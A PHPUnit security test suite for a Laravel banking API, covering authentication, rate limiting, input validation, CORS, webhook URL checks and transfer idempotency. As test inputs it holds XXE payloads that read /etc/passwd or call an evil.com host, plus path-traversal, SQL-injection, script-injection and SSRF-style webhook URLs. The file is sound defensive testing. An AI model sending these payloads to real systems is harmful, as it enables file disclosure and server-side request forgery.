<?php

namespace Tests\Security\API;

use App\Models\User;
use App\Models\Account;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\RateLimiter;
use Tests\TestCase;

class ApiSecurityTest extends TestCase
{
    use RefreshDatabase;

    protected User $user;
    protected string $token;

    protected function setUp(): void
    {
        parent::setUp();
        
        $this->user = User::factory()->create();
        $this->token = $this->user->createToken('test-token')->plainTextToken;
        
        // Clear rate limiters
        RateLimiter::clear('api');
        RateLimiter::clear('transactions');
    }

    /**
     * @test
     */
    public function test_api_requires_authentication()
    {
        $endpoints = [
            ['GET', '/api/v2/accounts'],
            ['POST', '/api/v2/accounts'],
            ['GET', '/api/v2/profile'],
            ['GET', '/api/v2/transactions'],
            ['POST', '/api/v2/transfers'],
            ['GET', '/api/v2/exchange-rates'],
        ];

        foreach ($endpoints as [$method, $endpoint]) {
            $response = $this->json($method, $endpoint);
            
            $this->assertContains($response->status(), [401, 404], "Endpoint {$endpoint} should require authentication or not exist");
            if ($response->status() === 401) {
                $response->assertJson(['message' => 'Unauthenticated.']);
            }
        }
    }

    /**
     * @test
     */
    public function test_api_versioning_is_enforced()
    {
        // Old version endpoints should not work
        $oldVersions = [
            '/api/accounts',
            '/api/v1/accounts',
            '/api/v0/accounts',
        ];

        foreach ($oldVersions as $endpoint) {
            $response = $this->withToken($this->token)->getJson($endpoint);
            $this->assertContains($response->status(), [404, 405]); // 405 if method not allowed
        }

        // Current version should work
        $response = $this->withToken($this->token)->getJson('/api/v2/accounts');
        $this->assertNotEquals(404, $response->status());
    }

    /**
     * @test
     */
    public function test_api_rate_limiting_per_user()
    {
        $hitLimit = false;
        $attempts = 0;

        // Make rapid requests
        for ($i = 0; $i < 200; $i++) {
            $response = $this->withToken($this->token)
                ->getJson('/api/v2/accounts');
            
            $attempts++;
            
            if ($response->status() === 429) {
                $hitLimit = true;
                break;
            }
        }

        $this->assertTrue($hitLimit, 'API should have rate limiting');
        $this->assertLessThan(200, $attempts, 'Rate limit should trigger before 200 requests');

        // Check rate limit headers
        $this->assertTrue($response->headers->has('X-RateLimit-Limit'));
        $this->assertTrue($response->headers->has('X-RateLimit-Remaining'));
        $this->assertTrue($response->headers->has('Retry-After'));
    }

    /**
     * @test
     */
    public function test_api_handles_malformed_json()
    {
        $malformedPayloads = [
            '{"name": "test"',           // Missing closing brace
            '{"name": "test", }',        // Trailing comma
            "{'name': 'test'}",          // Single quotes
            '{"name": undefined}',       // JavaScript undefined
            '{"name": NaN}',             // NaN value
            '{"amount": Infinity}',      // Infinity
            '{name: "test"}',            // Unquoted key
            '["array", "not", "object"]', // Array instead of object
            'null',                      // Null
            'true',                      // Boolean
            '"string"',                  // Plain string
            '12345',                     // Number
        ];

        foreach ($malformedPayloads as $payload) {
            $response = $this->withToken($this->token)
                ->postJson('/api/v2/accounts', [], ['Content-Type' => 'application/json'])
                ->withBody($payload, 'application/json');

            $this->assertContains($response->status(), [400, 422], "Should handle malformed JSON: {$payload}");
            
            // Should not expose internal errors
            $content = $response->content();
            $this->assertStringNotContainsString('ParseError', $content);
            $this->assertStringNotContainsString('SyntaxError', $content);
        }
    }

    /**
     * @test
     */
    public function test_api_validates_content_type()
    {
        $invalidContentTypes = [
            'text/plain',
            'text/html',
            'application/xml',
            'application/x-www-form-urlencoded',
            'multipart/form-data',
            'application/octet-stream',
        ];

        foreach ($invalidContentTypes as $contentType) {
            $response = $this->withToken($this->token)
                ->withHeaders(['Content-Type' => $contentType])
                ->post('/api/v2/accounts', [
                    'name' => 'Test Account',
                    'type' => 'savings'
                ]);

            $this->assertContains($response->status(), [400, 415], "Should reject content type: {$contentType}");
        }
    }

    /**
     * @test
     */
    public function test_api_input_size_limits()
    {
        // Test oversized payloads
        $largeString = str_repeat('a', 1024 * 1024); // 1MB string
        
        $response = $this->withToken($this->token)
            ->postJson('/api/v2/accounts', [
                'name' => $largeString,
                'description' => $largeString,
                'metadata' => array_fill(0, 1000, $largeString)
            ]);

        $this->assertContains($response->status(), [413, 422], 'Should reject oversized payloads');
    }

    /**
     * @test
     */
    public function test_api_prevents_xml_external_entity_attacks()
    {
        $xxePayloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/steal">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ];

        foreach ($xxePayloads as $payload) {
            $response = $this->withToken($this->token)
                ->withHeaders(['Content-Type' => 'application/xml'])
                ->post('/api/v2/accounts', $payload);

            // Should reject XML or handle safely
            $this->assertContains($response->status(), [400, 415, 422]);
            
            // Should not expose file contents
            $content = $response->content();
            $this->assertStringNotContainsString('root:', $content);
            $this->assertStringNotContainsString('/etc/passwd', $content);
        }
    }

    /**
     * @test
     */
    public function test_api_handles_method_override_attempts()
    {
        // Try to override HTTP method
        $overrideHeaders = [
            'X-HTTP-Method-Override' => 'DELETE',
            'X-Method-Override' => 'DELETE',
            '_method' => 'DELETE',
            'X-HTTP-Method' => 'DELETE',
        ];

        $account = Account::factory()->create(['user_uuid' => $this->user->uuid]);

        foreach ($overrideHeaders as $header => $value) {
            $response = $this->withToken($this->token)
                ->withHeaders([$header => $value])
                ->post("/api/v2/accounts/{$account->uuid}");

            // Should not delete the account
            $this->assertDatabaseHas('accounts', ['uuid' => $account->uuid]);
        }
    }

    /**
     * @test
     */
    public function test_api_pagination_limits()
    {
        // Create many accounts
        Account::factory()->count(100)->create(['user_uuid' => $this->user->uuid]);

        // Try to request excessive items per page
        $response = $this->withToken($this->token)
            ->getJson('/api/v2/accounts?per_page=10000');

        $data = $response->json('data');
        
        // Should enforce maximum items per page
        $this->assertLessThanOrEqual(100, count($data), 'Should limit items per page');

        // Test negative per_page
        $response = $this->withToken($this->token)
            ->getJson('/api/v2/accounts?per_page=-1');
        
        $this->assertContains($response->status(), [200, 422]);
        if ($response->status() === 200) {
            $this->assertNotEmpty($response->json('data'));
        }
    }

    /**
     * @test
     */
    public function test_api_error_messages_dont_leak_information()
    {
        $probes = [
            '/api/v2/../../etc/passwd',
            '/api/v2/accounts/../../admin',
            '/api/v2/accounts/123; SELECT * FROM users',
            '/api/v2/accounts/<script>alert(1)</script>',
        ];

        foreach ($probes as $probe) {
            $response = $this->withToken($this->token)->getJson($probe);
            
            $content = $response->content();
            
            // Should not expose system paths
            $this->assertStringNotContainsString('/var/www', $content);
            $this->assertStringNotContainsString('/home/', $content);
            $this->assertStringNotContainsString('storage/app', $content);
            
            // Should not expose framework details
            $this->assertStringNotContainsString('Laravel', $content);
            $this->assertStringNotContainsString('Symfony', $content);
            
            // Should not expose database details
            $this->assertStringNotContainsString('SQLSTATE', $content);
            $this->assertStringNotContainsString('MySQL', $content);
            $this->assertStringNotContainsString('PostgreSQL', $content);
        }
    }

    /**
     * @test
     */
    public function test_api_cors_configuration()
    {
        $origins = [
            'https://evil.com',
            'http://localhost:3000',
            'file://',
            'null',
        ];

        foreach ($origins as $origin) {
            $response = $this->withHeaders([
                'Origin' => $origin,
                'Authorization' => "Bearer {$this->token}"
            ])->options('/api/v2/accounts');

            if ($response->headers->has('Access-Control-Allow-Origin')) {
                $allowedOrigin = $response->headers->get('Access-Control-Allow-Origin');
                
                // Should not allow all origins
                $this->assertNotEquals('*', $allowedOrigin);
                
                // Should not allow suspicious origins
                $this->assertNotEquals('null', $allowedOrigin);
                $this->assertNotEquals('file://', $allowedOrigin);
            }
        }
    }

    /**
     * @test
     */
    public function test_api_webhook_security()
    {
        // Test webhook URL validation
        $maliciousUrls = [
            'http://localhost/webhook',
            'http://127.0.0.1/webhook',
            'http://0.0.0.0/webhook',
            'http://[::1]/webhook',
            'file:///etc/passwd',
            'gopher://evil.com',
            'dict://evil.com',
            'sftp://evil.com',
            'tftp://evil.com',
            'ldap://evil.com',
            'jar:http://evil.com!/',
        ];

        foreach ($maliciousUrls as $url) {
            $response = $this->withToken($this->token)
                ->postJson('/api/v2/webhooks', [
                    'url' => $url,
                    'events' => ['account.created']
                ]);

            $this->assertEquals(422, $response->status(), "Should reject webhook URL: {$url}");
        }
    }

    /**
     * @test
     */
    public function test_api_transaction_idempotency()
    {
        $account = Account::factory()->create([
            'user_uuid' => $this->user->uuid,
            'balance' => 100000
        ]);

        $idempotencyKey = 'test-key-' . uniqid();

        // First request
        $response1 = $this->withToken($this->token)
            ->withHeaders(['Idempotency-Key' => $idempotencyKey])
            ->postJson('/api/v2/transfers', [
                'from_account' => $account->uuid,
                'to_account' => Account::factory()->create()->uuid,
                'amount' => 1000,
                'currency' => 'USD'
            ]);

        // Second request with same key
        $response2 = $this->withToken($this->token)
            ->withHeaders(['Idempotency-Key' => $idempotencyKey])
            ->postJson('/api/v2/transfers', [
                'from_account' => $account->uuid,
                'to_account' => Account::factory()->create()->uuid,
                'amount' => 1000,
                'currency' => 'USD'
            ]);

        // Should return same response
        if ($response1->status() === 201) {
            $this->assertEquals($response1->json(), $response2->json());
            
            // Balance should only be deducted once
            $this->assertEquals(99000, $account->fresh()->balance);
        }
    }
}